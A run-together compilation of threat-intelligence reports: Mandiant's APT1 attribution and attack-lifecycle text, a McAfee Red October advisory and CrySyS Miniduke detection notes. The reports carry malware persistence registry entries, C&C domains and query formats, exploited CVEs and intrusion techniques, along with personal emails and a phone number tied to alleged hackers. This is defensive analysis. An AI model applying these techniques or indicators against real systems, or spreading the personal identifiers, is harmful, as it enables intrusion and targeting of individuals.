Second , it is a fairly common practice for the Chinese , even in China , to choose an English first name .
Thus `` JackWang '' may not have been an alias at all .
Another APT1 persona is `` dota '' ( DOTA ) , named for his strong tendency to use variants of that name in almost all accounts he creates and uses from his attack infrastructure .
DOTA may have taken his name from the video game '' Defense of the Ancients '' which is commonly abbreviated DotA , though we have yet to observe any direct link or other direct reference to the game .
We have monitored the creation of dozens of accounts , including d0ta010 @ hotmail.com and dota.d013 @ gmail.com , and have often seen DOTA create several sequential accounts ( for example dota.d001 through dota.d015 ) at web- based email services .
Most often these accounts are used in social engineering and phishing attacks or as the contact email address when signing up for other services .
For example , DOTA ( originating from the APT1 home range IP address 58.247.26.59 ) with a Simplified Chinese keyboard setting used the email address `` d0ta001 @ hotmail.com '' from his US hop to register the Facebook user `` do.ta.5011 '' ( Facebook user i d : 100002184628208 ) .
Some services , such as Google 's Gmail , require users to provide a phone number during the registration process to which they send a validation `` text message '' containing a verification code .
The user must then input the verification code on the website to finalize registration .
In an observed session on a compromised machine , DOTA used the phone number `` 159 - 2193 - 7229 '' to receive a verification text message from Google , which he then submitted to their page within seconds .
Telephone numbers in China are organized into a hierarchy containing an area code , prefix , and line number similar to phone numbers in the United States , with the addition that a few area codes are allocated for use by mobile phone providers .
The phone number `` 159 - 2193 - 7229 '' breaks down into the `` 159 '' area code , which indicates a mobile phone provided by China Mobile , and the prefix `` 2193 '' , which indicates a Shanghai mobile number .
This means at the very least that the number was initially allocated by China Mobile for use in Shanghai .
The speed of DOTA 's response also indicates that he had the phone with him at the time .
We have also observed DOTA using the names Rodney and Raith to communicate via email in fluent English with various targets including South East Asian military organizations in Malaysia and the Philippines .
It is unclear if this Gmail account is used exclusively for facilitating his CNO mission , but much of the traffic indicates its use in both simple phishing attacks , as well as more sophisticated email based social engineering .
When creating dozens , or hundreds , of accounts in online communities and on victim systems , password management becomes a significant undertaking .
Consequently , most APT1 attackers use passwords that are either pattern - based , such as the keyboard pattern `` 1qaz2wsx '' or highly memorable , using `` rootkit '' as a password on the information security research site rootkit.com .
Like many APT1 attackers , DOTA frequently uses keyboard based patterns as passwords such as `` 1qaz @ WSX # EDC '' .
However , there is one password `` 2j3c1k '' extensively used by DOTA that is not based on a keyboard pattern , though he may not be the only APT1 actor that uses it .
A numbered `` j '' , followed by a numbered `` c '' , and then a numbered `` k '' is likely shorthand ( `` j '' / '' c '' / '' k '' ) for the ju / chu / ke ( 局／处／科 ) organizational structure ( translated to Bureau / Division ( or Office ) /Section ) widely used within PLA General Staff Department organizations .
Project 2049 describes the typical PLA organizational structure as , `` Bureau - level directors … oversee between six and 14 subordinate sites or offices [ chu ; 处 ] … Sites / offices under bureaus are further divided into sections [ ke ; 科 ] .
Given this pattern , it is likely that the password `` 2j3c1k '' stands for 2nd Bureau [ Unit 61398 ] , 3rd Division , 1st Section , demonstrating that those who use these patterns are working together and affiliate themselves to the 2nd Bureau .
Attempting to track the DOTA persona back to a particular individual is difficult ; the trail of his activity does not link as clearly to a real world identity .
However , Mandiant has been able to establish a clear link between UG and DOTA .
Specifically , we have observed the two using shared APT1 infrastructure , FQDNs , and egress IP address ranges .
The coordination of this shared infrastructure , combined with their close proximity and association with Unit 61398 makes it highly likely that , at the very least , UG and DOTA know each other personally and likely even work together .
APT1 Hacker Profile : SuperHard ( Mei Qiang/梅强 ) The third and final persona we are revealing has been dubbed `` SuperHard '' ( SH ) .
SH was first observed as a tool author , and is either the creator or a significant contributor to the AURIGA and BANGAT malware families ( covered in Appendix C : The Malware Arsenal ) .
Similarly to UG , SH signs much of his work by embedding strings within the tools .
In particular , elements of the portable executable ( PE ) file 's VS_VERSIONINFO structure are frequently set to '' SuperHard , '' or cmd.exe copies are modified from `` Microsoft corp . '' to `` superhard corp . '' Additionally , many of SH 's tools contain driver modules designed to be loaded into the Windows kernel in order to subvert elements of the system .
While not unique for APT1 coders , this level of development expertise is certainly a discriminator that puts SH into a smaller group of highly capable developers within APT1 .
Often , SH 's tools are observed in use by other APT1 personae and in several instances , other APT groups we track .
Given that SH 's tools are used by other APT1 actors , and that there are no indications that SH is a full - time operator , we believe that SH is primarily involved in research and development for APT1 .
Once again , in tracking SH we are fortunate to have access to the accounts disclosed from rootkit.com .
The rootkit .
com account `` SuperHard_M '' was originally registered from the IP address 58.247.237.4 , within one of the known APT1 egress ranges , and using the email address `` mei_qiang_82 @ sohu.com '' .
We have observed the DOTA persona emailing someone with the username mei_qiang_82 .
The name `` Mei Qiang '' ( 梅强 ) is a reasonably common Chinese last / first name combination .
Additionally , it is a common practice for Chinese netizens to append the last two digits of their birth year , suggesting that SuperHard is in fact Mei Qiang and was born in 1982 .
Unfortunately , there are several '' Mei Qiang '' identities online that claim a birth year of 1982 , making attribution to an individual difficult .
Fortunately , we can use SH 's email address to connect him to a number of Websites and forums on which he registered and contributed using that address .
Many of these accounts reveal details that reinforce SH 's link to the '' mei_qiang_82 @ sohu.com '' email address and APT1 affiliation , such as SH offering to write Trojans for money , his involvement with malicious Windows kernel research ( incidentally , also commented on by `` greenfield '' , possibly UG ) , and more recently , being local to Shanghai 's Pudong New Area .
In a State that rigorously monitors Internet use , it is highly unlikely that the Chinese Government is unaware of an attack group that operates from the Pudong New Area of Shanghai .
The detection and awareness of APT1 is made even more probable by the sheer scale and sustainment of attacks that we have observed and documented in this report .
Therefore the most probable conclusion is that APT1 is able to wage such a long - running and extensive cyber espionage campaign because it is acting with the full knowledge and cooperation of the government .
Given the mission , resourcing , and location of PLA Unit 61398 , we conclude that PLA Unit 61398 is APT1 .
Table 12 summarizes the parallels between APT1 and PLA Unit 61398 .
Combining our direct observations with carefully researched and correlated findings ; we believe the facts dictate only two possibilities : Either A secret , resourced organization full of mainland Chinese speakers with direct access to Shanghai - based telecommunications infrastructure is engaged in a multi - year , enterprise scale computer espionage campaign right outside of Unit 61398 's gates , performing tasks similar to Unit 61398 's known mission .
Or APT1 is Unit 61398 .
Mandiant uses the term threat group to refer to a collection of intruders who are working together to target and penetrate networks of interest .
These individuals may share the same set of tasks , coordinate their targets , and share tools and methodology .
They work together to gain access to their targets and steal data .
Therefore , a group is ultimately defined by people and not by methodology .
However , defining a threat group based on observed intrusion activity is not so simple .
Without seeing who is sitting behind the keyboard it may be difficult to determine whether two different intrusion events were conducted by the same person , by two people who are working together , by two unrelated people who independently compromised the same network , or even the same computer .
Different groups may use similar intrusion methodology and common tools , particularly those that are widely available on the Internet , such as pwdump , HTRAN , or Gh0st RAT .
Furthermore , there may be overlaps between groups caused by the sharing of malware or exploits they have authored , or even the sharing of personnel .
Individual intruders may move between groups either temporarily or permanently .
An intruder may be a private citizen who is hired by multiple groups .
Finally , multiple groups may work together on occasion to compromise the same target .
Nevertheless , distinguishing one threat group from another is possible with enough information , analytical experience , and the technological tools to piece it all together .
Consider an analogy with the physical world : imagine a thief who leaves behind traces of his crime at various crime scenes .
Individual robberies may vary in many details : » » The method the thief used to break in ; » » The tools used to open the safe ; » » Whether the thief carefully selected a particular item to steal , or took everything in the hope that he managed to grab something of value ; » » Whether the thief carefully researched their target , disabled alarms , and attempted to remove evidence such as fingerprints ; or whether he was not very careful , but simply relied on being `` stealthy enough '' to not get caught .
Forensic scientists can analyze multiple crime scenes and be able to tell by the evidence left behind that a given crime scene was the result of one thief and not another .
In a similar way , cyber intruders leave behind various digital `` fingerprints .
'' They may send spear - phishing emails from a specific IP address or email address .
Their emails may contain certain patterns of subject lines .
Their files have specific names , MD5 hashes , timestamps , custom functions , and encryption algorithms .
Their backdoors may have command and control IP addresses or domain names embedded .
These are just a few examples of the myriad of linkages that computer forensic analysts consider when trying to distinguish one cyber threat group from another .
Digital `` fingerprints '' do not all carry equal weight in attribution analysis .
Their validity or value as indicators of a specific threat group depends largely on their likelihood of uniqueness .
For example , the use of a widely available tool such as HTRAN is not unique and not useful - by itself - as an indicator of a specific threat group .
In contrast , the use of a specific , custom backdoor not observed elsewhere is a much stronger indicator - although it is generally still not sufficient , on its own , for positive attribution .
At the most basic level , we say that two intrusion events are attributed to the same group when we have collected enough indicators to show beyond a reasonable doubt that the same person or group of people were involved .
While most computer intrusions follow a generic , high - level series of steps in the attack lifecycle , the Chinese APT lifecycle differs slightly because of their unique long - term objectives .
The sections below correspond to the stages of Mandiant 's Attack Lifecycle model and give an overview of what APT activity looks like in each stage .
The stages between `` Establish Foothold '' and `` Complete Mission '' do not have to occur in this order every time .
In fact , once established within a network , APT groups will continually repeat the cycle of conducting reconnaissance , identifying data of interest , moving laterally to access that data , and `` completing mission '' by stealing the data .
This will generally continue indefinitely until they are removed entirely from the network .
The Initial Compromise stage represents the methods that intruders use to penetrate a target organization 's network .
APT intruders frequently target individual users within a victim environment .
As such , the most commonly observed method of initial compromise is spear phishing .
Spear phishing messages may contain malicious attachments , a link to a malicious file , or a link to a malicious website .
Less commonly , APT intruders may attempt to contact potential victims and send malicious content via social networking sites or instant messaging .
Another common tactic is strategic web compromise , in which the attacker places malicious code on websites that people in targeted organizations will likely visit .
When they visit these websites in the course of their normal duties , they will be compromised if their computer is vulnerable to the attacker 's exploit code .
APT groups may also look for vulnerable Internet - facing web servers and upload webshells in order to gain access to a targets internal network , or look for other technical vulnerabilities in public - facing infrastructure .
Establishing a foothold ensures that APT threat groups can access and control one or more computers within the victim organization from outside the network .
APT groups can utilize public backdoors ( Gh0st RAT and Poison Ivy are common examples ) , `` underground '' backdoors found in hacker websites or obtained through personal connections , and `` custom '' backdoors that they developed themselves .
These backdoors usually establish an outbound connection from the victim network to a computer controlled by the attackers .
The communication methods used by the backdoors vary from clear text or simple encoding to the use of more advanced encoding or encryption .
The backdoors will give the APT groups basic access to a system , typically through a command shell or graphical user interface .
Escalating privileges involves acquiring items that will allow access to more resources within the victim environment .
Most often this consists of obtaining usernames and passwords , but it may also include gaining access to PKI certificates , VPN client software , privileged computers , or other resources required to access data or systems of interest .
APT intruders ( and intruders in general ) prefer to leverage privileged accounts where possible , such as Domain Administrators , service accounts with Domain privileges , local Administrator accounts , and privileged user accounts .
This is typically accomplished by first `` dumping '' password hashes from a computer , server , or ( preferably ) Domain Controller .
The attacker may be able to obtain legitimate account passwords by `` cracking '' password hashes .
Alternately , the attacker may leverage the hashes themselves in a `` pass - the - hash '' attack , where the hashed password itself may be used for authentication in lieu of the actual password .
A number of publicly available tools can be readily leveraged for both password dumping and pass - the - hash attacks .
In the Internal Reconnaissance stage , the intruder collects information about the victim environment .
APT threat actors use built - in operating system commands ( such as the Windows `` net '' commands ) to obtain information about the internal network , including computers , trust relationships , users , and groups .
In order to identify data of interest , they may perform directory or network share listings , or search for data by file extension , key word , or last modified date .
Data of interest may take many forms , but most commonly consists of documents , the contents of user email accounts , or databases .
Therefore file servers , email servers , and domain controllers are customary targets of internal reconnaissance .
Some APT groups utilize custom scripts in order to automate the process of reconnaissance and identification of data of interest .
In most cases , the systems that the intruders initially compromise do not contain the data that they want .
Therefore they must move laterally within a network to other computers that either contain that data or allow them to access it .
APT groups leverage compromised user credentials or pass - the - hash tools to gain access to additional computers and devices inside of a victim network .
They commonly use compromised credentials with PsExec and / or the Windows Task Scheduler ( `` at '' command ) to execute commands and install malware on remote systems .
In this stage , the intruders take actions to ensure continued control over key systems in the network environment from outside of the network .
APT groups often install new backdoors ( e.g. , different backdoors than the ones installed in the Establish Foothold phase ) in the environment during the course of the campaign .
They may install different families of malware on multiple computers and use a variety of command and control addresses , presumably for redundancy and to make it difficult to identify and remove all of their access points .
Additionally , APT groups may establish methods of network access that do not involve backdoors , so that they can maintain a presence even if network security personnel discover and remove their malware .
These methods may include the use of valid PKI or VPN credentials , allowing the intruders to masquerade as a legitimate user to gain access to a corporate network and internal resources .
In some instances APT threat actors have been able to circumvent two - factor authentication to maintain access to a victim network and its resources .
The main goal of APT intrusions is to steal data , including intellectual property , business contracts or negotiations , policy papers or internal memoranda .
Once APT groups find files of interest on compromised systems , they often pack them into archive files before stealing them .
They most commonly use the RAR archiving utility for this task , but may also use other publicly available utilities such as ZIP or 7-ZIP .
APT threat actors not only compress data , but frequently password - protect the archive .
From there they use a variety of methods to transfer files out of the victim network , including FTP , custom file transfer tools , or existing backdoors .
This appendix is digital and can be found at http : //www.mandiant.com / apt1 .
It includes profiles of malware families that APT1 has used .
This appendix is digital and can be found accompanying this report .
It includes fully qualified domain names ( FQDNs ) that APT1 has used as part of their attack infrastructure .
This appendix is digital and can be found at http : //www.mandiant.com / apt1 .
It includes MD5 hashes of malware that APT1 has used as part of their attack methodology . In Appendix G : IOCs , the IOC named 8dd23e0a - a659 - 45b4-a168- 67e4b00944fb.ioc contains all of the MD5 hashes provided in this appendix for use in conjunction with Redline™ , Mandiant 's free host - based investigative tool , or with Mandiant Intelligent Response® ( MIR ) , Mandiant 's commercal host - based investigative tool .
This appendix is digital and can be found at http : //www.mandiant.com / apt1 .
It includes APT1 SSL certificates used on servers that are part of their command and control infrastructure .
The portion of this appendix that includes the Indicators of Compromise ( IOCs ) is digital and can be found at http : // www.mandiant.com/apt1 .
With the release of Mandiant 's report , APT1 : Exposing One of China 's Cyber Espionage Units , we are providing a set of APT1 IOCs in the digital portion of Appendix G to help detect malware described in Appendix C : The Malware Arsenal .
IOCs can be used in investigations to find unknown evils or for detection of already known threats .
The IOCs included in Appendix G fit the latter ; however , keep in mind that APT1 does update their tools , and there are certainly malware variants and new families of malware that will not be detected with this set of IOCs .
To find out more about the report or the digital appendices ( to include downloading the set of APT1 IOCs in Appendix G : IOCs ) go to http : //www.mandiant .
com / apt1 .
IOCs can be used in conjunction with Redline , Mandiant 's free host - based investigative tool , or with Mandiant Intelligent Response® ( MIR ) , Mandiant 's commercial host - based investigative tool .
Mandiant 's customers who have licensed MIR can simply import a zip file of the IOCs into their controllers .
For those without MIR , Redline can be downloaded from Mandiant 's web site at http : //www.mandiant.com / resources / download / redline .
Remember to always test new IOCs before using them in a production environment .
Mandiant has developed an open , extendable standard for defining and sharing threat information in a machine- readable format .
Going well beyond static signature analysis , IOCs combine over 500 types of forensic evidence with grouping and logical operators to provide advanced threat detection capability .
If you are not familiar with IOCs , go to the OpenIOC site for a description at http : //openioc.org .
Redline is Mandiant 's free tool for investigating hosts for signs of malicious activity through memory and file analysis , and subsequently developing a threat assessment profile .
Redline provides several benefits including the following : When confronted with a potentially compromised host , responders must first assess whether the system has active malware .
Without installing software or disrupting the current state of the host , Redline thoroughly audits all currently- running processes and drivers on the system for a quick analysis ; for a detailed analysis , it also collects the entire file structure , network state , and system memory .
Redline will also compare any MD5 value it collects , analyzes , and visualizes against an MD5 whitelist .
Users can further analyze and view imported audit data using Redline 's Timeline functionality , which includes capabilities to narrow and filter results around a given timeframe with the TimeWrinkles™ and TimeCrunches™ features .
The Redline Portable Agent can collect and analyze a complete memory image , working below the level at which kernel rootkits and other malware - hiding techniques operate .
Many hiding techniques become extremely obvious when examined at the physical memory level , making memory analysis a powerful tool for finding malware .
It also reveals '' memory only '' malware that is not present on disk .
Mandiant 's Redline tool streamlines memory analysis by providing a proven workflow for analyzing malware based on relative priority .
This takes the guesswork out of task and time allocation , allowing investigators to provide a focused response to the threats that matter most .
Redline calculates a `` Malware Risk Index '' that highlights processes more likely to be worth investigating , and encourages users to follow investigative steps that suggest how to start .
As users review more audits from clean and compromised systems , they build up the experience to recognize malicious activity more quickly .
As you investigate a system , here 's how Redline will help you focus your attention on the most productive data : Redline can collect a daunting amount of raw information .
Its investigative steps help provide a starting place by highlighting specific data and providing views that are most commonly productive in identifying malicious processes .
Unless you are pursuing a specific `` lead '' , we recommend working through the steps in order , examining the information for entries that do n't match your expectations .
The key to becoming an effective investigator is to review Redline data from a variety of `` clean '' and `` compromised '' systems .
Over time , your sense of which entries are normal and which are of concern will develop quickly as you view more data .
Redline analyzes each process and memory section using a variety of rules and techniques to calculate a `` Malware Risk Index '' for each process .
This score is a helpful guide to identifying those processes that are more likely to be worth investigating .
Processes at the highest risk of being compromised by malware are highlighted with a red badge .
Those with some risk factors have a grey badge , and low - risk processes have no badge .
The MRI is not an absolute indication of malware .
During an investigation you can refine the MRI scoring by adjusting specific hits ( identifying false positives and false negatives ) for each process , adding your own hits , and generally tuning the results .
Redline provides the option of performing IOC analysis in addition to MRI scoring .
Supplied a set of IOCs , the Redline Portable Agent will be automatically configured to gather the data required to perform a subsequent IOC analysis ; after the analysis is run , IOC hit results are available for further investigation .
In addition , Redline provides the ability to create an IOC Collector .
This feature enables the collection of data types required for matching a set of IOCs .
Combined with MIR , Redline is a powerful tool for accelerated live response .
Here 's a typical case : These IOCs are new ! However , much of the detection capability in this set of indicators has already been available to our MIR customers .
The IOCs may look different though as a result of improvements in creation and testing .
Mandiant started 2013 with a focus on taking better advantage of our threat intelligence .
We plan to continue to improve the synthesis of our threat intelligence and our IOCs by improving our breadth , IOC creation process , IOC management process , and IOC testing .
The majority of these indicators , or modified versions of them , will be integrated into the next IOC release .
We are using a new IOC designator in these IOCs called `` ( FAMILY ) .
'' Mandiant 's Threat Intelligence Unit tracks malware by common features seen in groups of binaries .
We call those groupings of binaries `` families .
'' The IOCs included in this appendix are representatives of families of malware used by APT1 .
The new designator follows the family name in the `` Name '' field of the IOC , and the presence of ( FAMILY ) implies that that IOC applies to the whole family , not just one sample .
In many cases we have combined information that previously would have been in several indicators into a single indicator .
Additionally , we have removed certain types of intelligence , since they are being released in separate appendices ( such as FQDNs and IPs ) .
Additionally , some IOCs in this set are using file permutation blocks to catch variants of malware that might not be detected otherwise .
It is a different way to structure lists of File Item attributes to look for an entire family of malware versus only one or two pieces .
For more information on this topic or most any other IOC questions go to https : //forums.mandiant.com .
It is likely that we will make some changes to the IOCs in Appendix G as we get feedback .
If updated , the updates will be available in the same location as the report http : //www.mandiant.com / apt1 .
Currently , there are no plans for additional public releases of this magnitude .
This appendix is digital and can be found at http : //www.mandiant.com / apt1 .
It includes a compilation of videos showing actual attacker sessions and their intrusion activities .
'' Red October '' is a targeted attack and cyber espionage network that was discovered to be targeting Diplomatic and Government agencies .
The threats that were used in this attack campaign have been known to be active since 2009 .
This targeted attack involves both MS - office and Java based exploits .
The payloads used in the exploitation are mostly backdoors and password stealers that steal the user 's information and send it in an encrypted form to the remote attacker .
Detailed information about the infection , its propagation , and mitigation are in the following sections :  Infection and Propagation Vectors  Characteristics and Symptoms  Exploit HeatMap  Restart Mechanism  Getting Help from the McAfee Foundstone Services team The exploits used in the targeted attack are sent to the users through spear phishing e - mails that contain crafted malicious documents as attachments , and a malicious link embedded in the e - mail that leads to a compromised website .
Once the user opens the malicious document containing the embedded code , a malicious payload is dropped into the system .
The dropped payload in turn communicates with the C & C servers .
The payload receives additional modules from the C & C server to handle the infection on different types of devices and also could drop additional malware .
There could be different combinations of Microsoft and Java exploits and payload in the wild to achieve this attack .
We have used one of the MD5s ( 51EDEA56C1E83BCBC9F873168E2370AF ) to do this analysis , which is a document file .
The Red October campaign is known to target the following mentioned vulnerabilities :  CVE-2012 - 0158 ( MS Word )  CVE-2010 - 3333 ( MS Word )  CVE-2009 - 3129 ( MS Excel )  CVE-2011 - 3544 ( Java Rhino Script Engine Vulnerability ) The following picture clearly shows how the targeted attack happens in the Red October Campaign .
The phishing email contains an attachment with the malicious office document .
This file , when opened , exploits one of the above mentioned vulnerabilities and drops the payload file `` msmx21.exe '' .
After successful exploitation of the vulnerability , the embedded executable file ( msmx21.exe ) is dropped in the % temp % folder .
msmx21.exe creates and executes the following files : % Temp % \msc.bat % ProgramFiles % \Windows NT\svchost.exe % ProgramFiles % \Windows NT\wsdktr.ltp ( Encrypted payload ) - > random name The dropped batch file has the following content : The use of `` chcp 1251 '' in the batch file is to switch the codepage of an infected system to handle Cyrillic characters .
This might suggest that either the attack originates from Russia or was also targeted towards government agencies in Russia .
Svchost.exe is an installer component that decrypts and loads the main backdoor ( wsdktr.ltp ) .
It connects to the following Microsoft hosts to check for a live Internet connection : update.microsoft.com www.microsoft.com support.microsoft.com wsdktr.ltp is an encrypted executable file ( UPX packed dll ) that is decrypted and loaded into memory by svchost.exe .
The decrypted file is responsible for the communication between the infected machine and C & C server as shown in the following image .
The following domains are used for C & C : nt-windows-online.com nt-windows-update.com nt-windows-check.com csrss-check-new.com In Java Rhino Script Engine Vulnerability , security manager is disabled during JavaScript execution , which would enable full permission to the system during its execution .
When the user clicks the link that came through the spam mail , the exploit would be triggered on the vulnerable system .
The downloaded payload creates and executes the following files : % Temp % \ tmp42e76b5f.bat - > random name % Application Data % \Keucot\ qagi.exe - > random name % Application Data % \ Okurp \ dezaa.ufy- > random name ( encrypted content ) The following debugged code shows the batch being created while execution .
The batch file has the following content : The payload injects itself to the running system processes in the machine .
They also monitor the browser activities in the targeted browsers ( Chrome , Firefox , Safari , and IE ) .
The above picture shows the changes made to the configuration file so that cookies wo n't be cleared when the user shuts down the system .
Also warning messages wo n't be displayed when the user visits the malicious or insecure pages .
Malicious threads injected to the processes monitor the user 's activities and collect the information about the Outlook contacts and browser cookies , along with the system information .
The collected information is stored as an encrypted content and sent to the command & control server .
Some of these exploits download Ransomware and Zbot payloads .
C & C Server : 29f2aad01fee3663.com McAfee has coverage for this exploit CVE-2011 - 3544 and detects the downloaded payload used in the targeted attack as BackDoor - FJJ .
The following statistics show the usage of the vulnerabilities in the targeted attack in the last quarter .
The following registry entry would enable the Trojan to execute every time when Windows starts .
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon `` Userinit '' '' C : \WINDOWS\system32\userinit.exe , '' '' C : \WINDOWS\system32\userinit.exe , C : \Program Files \WindowsNT\svchost.exe '' HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Zeemav : `` '' C : \Documents and Settings\Home\Application Data\Keucot\qagi.exe '' '' Users are requested to exercise caution while opening unsolicited emails and unknown links .
Users are advised to update Windows and third - party application security patches and virus definitions on a regular basis and have proper filtering rules .
 Use Access Protection Rules from accessing such run keys .
 Please keep your anti - virus updated .
 Keep software up - to - date with the latest available patches .
 It is advisable to use your firewall to monitor unusual traffic .
 Disable AutoPlay to prevent the automatic launching of executable files on network and removable drives .
This document is intended to provide a summary of current intelligence and best practices to ensure the highest level of protection from your McAfee security solution .
The McAfee Foundstone Services team offers a full range of strategic and technical consulting services that can further help to ensure you identify security risk and build effective solutions to remediate security vulnerabilities .
27/02/2013 Initial release Our malware analysis team in the CrySyS Lab , Budapest worked together with Kaspersky Labs on the analysis of the Miniduke malware .
Our participation in this research was justified by a detected Hungarian incident .
A detailed report on the results of our joint efforts has been published by Kaspersky Labs Securelist blog site ( see link below ) .
The Kaspersky Labs report describes what we currently know about the operation of Miniduke including its stages , and also information on the C & C infrastructure and communications .
In this report , we summarize the indicators of a Miniduke infection , and give specific hints on its detection .
The Kaspersky Labs report is available at https : //www.securelist.com / en / blog/208194129/The_MiniDuke_Mystery_PDF_0_day _ Government_Spy_Assembler_Micro_Backdoor The available malware samples are highly obfuscated , and compiled by a polymorphic compiler .
The attackers were able to produce new variants with only a few minutes difference between compile times .
Therefore the number of distinct samples could be very large .
bg _ < sthg > .gif
and bg _ < sthg > .gif_dec
refers to pieces of stage 2 of the malware , which are downloaded from the C & C server by the stage 1 code .
bg _ < sthg > .gif
is a gif file that contains encrypted code , bg _ < sthg > .gif
is the corresponding decrypted file .
bg _ < sthg > .gif
is generally 24484 bytes long , while bg _ < sthg > .gif_dec
is 22784 bytes long .
< i d > .gif
files are pieces of stage 3 codes prepared for specific victims with < i d > used as an ID .
These are typically 334093 byte long files with a 13-byte long gif header .
Below , we list the hashes of these files ; in case of the decrypted files with .gif_dec
extension , we list the hashes for the internal decrypted PE file .
Due to a large number of compiled samples , there is a high chance that the current version is difficult to detect by signatures .
Yet , there are common features in the samples that can be used to identify the malware components .
In every sample we checked , the `` Program Files / Startup '' contains a file with `` .lnk
'' extension after installation .
This is used to start up the malware after the computer is rebooted .
An example of the lnk file created by the malware : The contents of the .lnk
files are similar to the below described path and file , but random names are used .
The extension of the dll called is generally `` .tmp
'' or `` .cat
'' or `` .db
'' ( not sure about full list ) and the export function called has a random name .
`` C : \WINDOWS\system32\rundll32.exe '' C : \DOCUME~1\ALLUSE~1\APPLIC~1\base.cat , JorNgoq The running process of the malware can be pinpointed , e.g. , by using ProcessExplorer .
The running copies of stage 1 and 2 appear as separated rundll.exe processes .
It is very useful to create a memory dump from these running processes , e.g. , by using SysInternals ProcessExplorer .
On the picture below , the export function name they use is GqOlls .
The names seem to follow a pattern : 6 chars long with two upper case letters .
A not fully cross - checked information is that during installation the malware will be copied in two copies to the system and the two executables differ .
This might mean that the executable modifies itself .
For example , we recovered the following two files : md5sum base.cat : 113e6fc85317fdd135e3f5f19e6c7a58 * base.cat md5sum ~6rld.tmp : c786a4cdfe08dbe7c64972a14669c4d1 * ~6rld.tmp where base.cat is the startup file , which is created based on ~6lrd.tmp .
base.cat is stored in the `` All users '' directory , whereas ~6lrd.tmp is stored in a user 's directory , e.g. , in the guest user directory as `` C : \Documents and Settings\guest\Local Settings\Application Data\~6rld.tmp '' This user directory contains at least one more file , update.cmd with a specific content that could be used for detection .
E.g. , a search for any * .cmd files with content `` TASKKILL /f /IM acro * '' might be a a detection tool of this stage .
As for stage 3 of the attack , it is important to note that it is not yet analyized deeply .
So once a victim downloads the ~300k long piece of code , we do n't know what happens with the previous stages , and we have no information about detections once this stage is reached , except the usage of the C & C server news.grouptumbler.com .
There are multiple layers of C & C communications in the malware .
First the malware uses Google search to receive information from its master .
Then , it uses the Twitter messaging service looking for the twits of a specific Twitter user .
Commands received via this channel trigger the download of stage 2 and stage 3 code from the C & C server .
We identified the following C & C servers delivering stage 2 and stage 3 codes : The C & C server used by stage 3 of the malware is news.grouptumbler.com and it is located in Panama .
At the time of this writing , port 80 seems to be closed on this server .
Address and open port information is below : Basic detection can be based on 3 queries that are initiated by the victim computers within seconds .
Known search strings in Google search ( see below ) can also be used to detect the malware .
Unfortunately , these strings are most likely unique to each C & C server or victim , thus unknown samples might use other strings , but possibly with the same length .
The malware also sends a query to the geoiptool .
An example is shown below : Initial communications with the stage 2/3 delivery C & C servers ( such as arabooks.ch ) can be used to develop detection signatures as follows : The malware retrieves the URL using a Twitter query as described earlier .
Then , we can observe the first query from the victim towards the stage 2/3 delivery C & C server .
This query contains pure HTTP traffic on port 80 to the server following the template below .
GET /original / path / shortname / index.php ? e = aaaaaaaaa where : • shortname can be a number of strings , generally human readable ( e.g .
lib , engine , forum , forumengine etc .
) • `` e= '' is not constant , can be anything , but generally 1 - 2 letters long • aaaaaaaaa stands for some Base64-like text ( see details below ) • the servers used are assumed to be legitimate sites , just hacked by the attackers .
Based on this format , we can detect a valid query as follows : • The name of the 1st GET parameter should be discarded • this means `` e= '' is not important • we saw only one GET parameter , queries with multiple parameters are likely not used For detection , the Base64-like string `` aaa … '' should be first modified as follows : • `` - '' should be replaced by `` + '' • `` _ '' should be replaced by `` / '' This results in correct Base64 encoding , which can be decoded with library functions such as base64_decode .
After decoding , a string of data , partially binary will be available .
Parts are separated by the delimiter character `` | '' .
The format and a numerical example are below : < binary data ( ~100 bytes ) > | < numerical ID ( ~10 digits ) > | < version number > e.g. , < binary data > |5551115551|1.13 As the binary data itself may contain the `` | '' character , parsing should start from the end ( i.e. , the numerical ID starts from the second `` | '' character from the end ) .
In additional , the ID length may vary ( not fully confirmed ) , but it seems to be around 10 digits .
Finally , the version number always follows the pattern < 1digit > < dot > < two digits > , e.g. , 1.1X 3.1X .
The correct decoding of the HTTP query information should be enough to quickly develop possible IDS - based detections .
As we have seen , detection is complicated , but not impossible .
The following is the summary of potential detection steps : • Check if there is only one GET parameter • ( check if path is not empty and contains index.php ) ( possible , but not confirmed ) • convert the Base64-like GET parameter string into real Base64 encoding , and check if it decodes correctly • check if the decoded string has at least two delimieter character `` | '' in it • check if after the last but first `` | '' character , there are digits only • check if the version part of the string follows the format `` 1.11 '' or similar The header sent is fairly standard , but we include one example nonetheless : The used Agent strings vary significantly across queries , therefore they can not be really used for detection : The Google search step also uses different agent strings : The C & C server 's response – if it sends encrypted files – is a GIF file containing a small icon , and after that , the malware : For stage 3 ( i.e. , < i d > .gif
files ) , the file downloaded has a larger size ( ~300 KB ) .
It also begins with a GIF header , but that header is only 13 bytes long , and then starts the encrypted executable , as shown below : Examples for twits containing the URL of the C & C server are shown below : The twitter information is currently not very useful for content based detection , as it is downloaded through SSL connection , and therefore , IDS rules can only be applied if some SSL proxy is used .
An interesting observation is that this user follows 4 partners , most likely for deception .
This piece of malware is made of three components : pdf , main , payload .
The PDF file embeds exploit code and a dropper that writes the `` main '' DLL component on the drive .
Additionally , the original PDF also contains a clean PDF file used in the social engineering stage .
As the malicious PDF file is opened , the Adobe process gets exploited , which results in running the dropper .
In turn , upon the dropper 's execution , the host process is killed and the clean PDF file gets displayed .
This trick allows the malware to run inconspicuously , without the user noticing that something has happened in the background .
The main DLL file is also loaded and runs in installation mode ( see the First Installation section ↓ ) .
Once installed , the malware calls back home using a URL found via Twitter or Google search query .
When successfully connected , new updates or payloads are installed under the disguise of .gif
images .
There may be other infection mechanisms other than PDF files , but they remain unknown at the moment .
Until now , we have only found spreading mechanisms that use social engineering via malicious PDF files sent over e - mail ( see Appendix F : Forged documents↓ ) .
The ( Appendix D : E - Mail samples used in attacks↓ ) section shows such a sample isolated from a real - life attack .
The following exploits have been used to trigger the infection : 2012 CVE-2011 - 2462 2013 CVE-2013 - 0640 The infection vector for the samples dated 2011 is unknown .
The list of known samples is available in the Samples by Year Appendix ↓ .
The file contains four or five sections with standard names such as : .text
, .data
, .reloc
, .edata
, .rdata
.
The packer code is relatively small ( < 1024 bytes ) .
It is encrypted and located in the .text
section .
The packer is used to decrypt the main code located in the largest section - usually .data
or .rdata
.
The DLL file only exports one function with a random name .
